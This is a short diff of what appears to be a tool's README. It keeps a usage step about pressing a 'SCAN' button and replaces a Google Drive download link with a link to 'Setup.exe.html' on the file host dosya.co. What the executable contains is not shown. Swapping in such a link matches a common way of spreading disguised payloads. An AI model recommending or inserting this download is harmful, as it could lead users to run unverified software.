@@ -13,4 +13,5 @@ USAGE
 - On the opened page, press the "SCAN" button.
 
 DOWNLOAD / İNDİR
-https://drive.google.com/file/d/1jiuHtZoeq3pUdQiEF7WhTjiJXr-9TRZw/view?usp=drive_link
+https://dosya.co/q1kd1mnfxxzh/Setup.exe.html
+
